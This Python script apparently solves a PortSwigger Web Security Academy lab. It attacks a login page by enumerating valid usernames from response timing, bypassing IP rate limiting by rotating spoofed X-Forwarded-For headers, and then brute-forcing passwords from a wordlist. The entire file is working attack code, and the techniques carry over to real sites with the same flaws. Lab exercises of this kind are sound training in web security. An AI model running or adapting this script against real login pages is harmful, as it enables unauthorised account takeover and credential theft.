#!/usr/bin/python3
import requests
import warnings

# Ignore any and all warnings and don't show it on cmd output
warnings.simplefilter("ignore")

# request body in dictionary
payload = {"username": "wiener", "password": "a"*50}
url="https://0a1c00bb035fc9f082e0307a003500ab.web-security-academy.net/login"
headers = {"X-Forwarded-For": "192.168.0.2"}

def enum_users():
    # List of usernames to enumerate.
    users = list()

    # Read users.lst and store it in a list to be used further
    with open("./users.lst", "rt") as userslst:
        for user in userslst.readlines():
            users.append(user.strip())

    validUsers = list()
    numberOfRequestsBeforeBlockingIP = 0
    for user in users:
        print("[*] Trying username", user, sep=": ")
        payload["username"] = user # change the placeholder of username field to the user from users list

        # If number of requests reach to a point when IP will be blocked then change the IP
        if numberOfRequestsBeforeBlockingIP == 3:
            numberOfRequestsBeforeBlockingIP = 0
            headers["X-Forwarded-For"] = "192.168.0." + str(int(headers["X-Forwarded-For"].split(".")[-1]) + 1)
        # Send the HTTP POST request to the url
        response = requests.post(url, data=payload, headers=headers, verify=False)

        # check if the response time is greater than some value, if not then valid username
        if response.elapsed.microseconds > 800000:
            print("\t[+] Found valid username", user, sep=": ")
            validUsers.append(user)
        numberOfRequestsBeforeBlockingIP += 1

    print("\n\n[*] Valid Users", validUsers, sep=": ")

    return validUsers

def enum_password(validUsers):
    # List of usernames to enumerate.
    passwords = list()
    headers = {"X-Forwarded-For": "192.168.40.1"}

    # Read users.lst and store it in a list to be used further
    with open("./passwords.lst", "rt") as passlst:
        for password in passlst.readlines():
            passwords.append(password.strip())
    
    numberOfRequestsBeforeBlockingIP = 0
    for user in validUsers:
        print("[*] For username", user, sep=": ")
        payload["username"] = user # change the placeholder of username field to the user from users list

        for password in passwords:
            print("\t[*] Trying password", password, sep=": ")
            payload["password"] = password # change the placeholder of password field to the password from passwords list

            # If number of requests reach to a point when IP will be blocked then change the IP
            if numberOfRequestsBeforeBlockingIP == 3:
                numberOfRequestsBeforeBlockingIP = 0
                headers["X-Forwarded-For"] = "192.168.40." + str(int(headers["X-Forwarded-For"].split(".")[-1]) + 1)
        
            # Send the HTTP POST request to the url
            response = requests.post(url, data=payload, headers=headers, verify=False)

            # check if the "Invalid password" is in the response, if not then valid password
            if "Invalid username or password." not in response.text:
                print(f"\t\t[+] Found valid username:password pair {user}:{password}")
                break
            numberOfRequestsBeforeBlockingIP += 1

enum_password(enum_users())